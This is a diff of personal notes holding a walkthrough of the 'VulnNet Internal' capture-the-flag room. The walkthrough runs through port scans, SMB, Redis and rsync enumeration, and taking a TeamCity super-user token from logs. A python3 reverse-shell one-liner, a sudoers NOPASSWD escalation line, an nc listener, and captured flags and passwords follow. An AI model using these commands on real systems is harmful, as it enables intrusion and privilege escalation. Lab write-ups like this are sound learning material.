@@ -53,7 +53,6 @@ nmap -p22,139,111,445,873,2049,6379,38607,50567,59263,59667 -sV -sC -T4 -Pn -oA 
 ************************************************************
 Would you like to run Nmap or quit to terminal?
 
-
 ┌──(kali㉿kali)-[~]
 └─$ rustscan -a 10.10.104.221 --ulimit 5500 -b 65535 -- -A
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
@@ -228,7 +227,6 @@ Completed NSE at 12:04, 0.00s elapsed
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 27.18 seconds
-
 
 ┌──(kali㉿kali)-[~/threader3000]
 └─$ smbclient -L 10.10.104.221
@@ -564,7 +562,6 @@ PONG
 10.10.104.221:6379> GET "internal flag"
 "THM{ff8e518addbbddb74531a724236a8221}"
 
-
 10.10.104.221:6379> keys *
 1) "marketlist"
 2) "internal flag"
@@ -801,7 +798,6 @@ Password: Hcg3HP67@TW@Bc72v
 drwxr-xr-x          4,096 2021/02/01 07:51:14 .
 drwxr-xr-x          4,096 2021/02/06 07:49:29 sys-internal
 
-
 ┌──(kali㉿kali)-[~]
 └─$ rsync --list-only rsync://rsync-connect@10.10.104.221/files/sys-internal/
 Password: Hcg3HP67@TW@Bc72v
@@ -863,7 +859,6 @@ Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage
 
-
  * Canonical Livepatch is available for installation.
    - Reduce system reboots and improve kernel security. Activate at:
      https://ubuntu.com/livepatch
@@ -872,7 +867,6 @@ Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)
 342 updates are security updates.
 
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
 
 The programs included with the Ubuntu system are free software;
 the exact distribution terms for each program are described in the
@@ -915,7 +909,6 @@ drwxr-xr-x  2 sys-internal sys-internal 4.0K Feb  1  2021 Videos
 -rw-------  1 sys-internal sys-internal 2.5K Feb  6  2021 .xsession-errors.old
 sys-internal@vulnnet-internal:~$ cat user.txt
 THM{da7c20696831f253e0afaca8b83c07ab}
-
 
 sys-internal@vulnnet-internal:~$ cd /
 sys-internal@vulnnet-internal:/$ ls
@@ -1017,7 +1010,6 @@ Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage
 
-
  * Canonical Livepatch is available for installation.
    - Reduce system reboots and improve kernel security. Activate at:
      https://ubuntu.com/livepatch
@@ -1035,7 +1027,6 @@ uid=1000(sys-internal) gid=1000(sys-internal) groups=1000(sys-internal),24(cdrom
 
 http://127.0.0.1:8111/login.html
 
-
 http://127.0.0.1:8111/login.html?super=1
 
 Need an Authentication token
@@ -1048,9 +1039,7 @@ sys-internal@vulnnet-internal:/TeamCity/logs$ grep -iR token /TeamCity/logs/ 2>/
 /TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 3548075100441509270 (use empty username with the token as the password to access the server)
 /TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 3548075100441509270 (use empty username with the token as the password to access the server)
 
-
 Using the last token, we can connect as super admin
-
 
 create project manually
 
@@ -1067,9 +1056,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 or
 
-
 echo "sys-internal  ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/sys-internal
-
 
 ┌──(kali㉿kali)-[~/threader3000]
 └─$ rlwrap nc -lnvp 1337                                                          
@@ -1091,17 +1078,9 @@ root
 root@vulnnet-internal:/home/sys-internal# cat /root/root.txt
 THM{e8996faea46df09dba5676dd271c60bd}
 
-
 :)
 
-
 ```
-
-![[Pasted image 20221229135916.png]]
-![[Pasted image 20221229135934.png]]
-![[Pasted image 20221229140149.png]]
-![[Pasted image 20221229145832.png]]
-![[Pasted image 20221229145928.png]]
 
 What is the services flag? (services.txt)
 
@@ -1122,6 +1101,5 @@ What is the user flag? (user.txt)
 What is the root flag? (root.txt)
 
 *THM{e8996faea46df09dba5676dd271c60bd}*
-
 
 [[VulnNet Node]]
